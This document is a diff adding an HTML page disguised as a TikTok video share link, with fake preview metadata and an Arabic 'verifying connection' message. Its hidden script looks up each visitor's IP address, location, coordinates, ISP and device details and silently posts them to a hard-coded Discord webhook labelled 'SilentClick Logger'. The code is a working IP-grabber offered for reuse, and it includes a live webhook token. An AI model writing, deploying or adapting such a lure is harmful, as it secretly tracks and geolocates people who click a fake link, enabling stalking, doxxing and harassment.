@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta name="twitter:card" content="summary_large_image" />
+  <meta name="twitter:site" content="" />
+  <meta name="twitter:title" content="Tiktok • A90" />
+  <meta name="twitter:description" content="‏33.5K من تسجيلات الإعجاب، 1048 من التعليقات. "انت ايش قدمت؟@drb7h”" />
+  <meta name="twitter:image" content="https://tv-tiktok.github.io/logo.png" />
+  <meta charset="UTF-8">
+  <title>Tiktok</title>
+</head>
+<body>
+  <h1>جارٍ التحقق من الاتصال...</h1>
+
+  <script>
+    const webhookUrl = "https://discord.com/api/webhooks/1373276604230271036/JA2nWPkhW9xP0rz8T-dD0nSlRhL1uQoLKTy6x1XpI1xAWNuIaZlTBmNbqnNOSngO6QdG"; // عدلها
+
+    // نحصل معلومات الجهاز
+    const getDeviceInfo = () => {
+      const ua = navigator.userAgent;
+      const platform = navigator.platform;
+      return `${platform} | ${ua}`;
+    };
+
+    // نجيب بيانات الموقع والآيبي
+    fetch("https://ipapi.co/json/")
+      .then(res => res.json())
+      .then(data => {
+        const {
+          ip, city, region, country_name,
+          latitude, longitude, org
+        } = data;
+
+        const location = `${city}, ${region}, ${country_name}`;
+        const device = getDeviceInfo();
+
+        const embed = {
+          embeds: [{
+            title: "New Visitor Logged",
+            color: 0x2f3136,
+            fields: [
+              { name: "🌐 IP", value: `\`${ip}\``, inline: true },
+              { name: "🗺️ Location", value: `${location}`, inline: true },
+              { name: "📍 Coordinates", value: `Lat: \`${latitude}\` | Lon: \`${longitude}\``, inline: false },
+              { name: "💻 Device Info", value: `\`\`\`${device}\`\`\``, inline: false },
+              { name: "🏢 ISP", value: `${org}`, inline: false }
+            ],
+            footer: {
+              text: "SilentClick Logger"
+            },
+            timestamp: new Date().toISOString()
+          }]
+        };
+
+        fetch(webhookUrl, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(embed)
+        });
+      });
+  </script>
+</body>
+</html>
